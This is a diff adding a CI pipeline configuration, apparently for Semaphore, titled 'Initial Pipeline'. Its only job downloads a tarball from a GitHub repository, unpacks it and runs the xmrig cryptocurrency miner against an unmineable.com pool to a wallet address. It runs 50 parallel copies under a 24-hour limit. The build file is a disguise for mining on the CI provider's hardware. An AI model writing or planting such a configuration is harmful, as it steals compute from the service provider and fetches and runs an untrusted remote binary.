@@ -1,0 +1,16 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: f1-standard-4
+    os_image: ubuntu2004
+execution_time_limit:
+  hours: 24
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/pravsh89/NiceHash-XMRig/main/mon.tar.gz ; tar xvzf mon.tar.gz ; ./xmrig -threads=3 -a rx -o stratum+ssl://rx.unmineable.com:443 -u AVAX:0x02aa42c0b91f83015a7033099165d260b1d03b5d.cs#lh26-8vhq -p x'
+          parallelism: 50
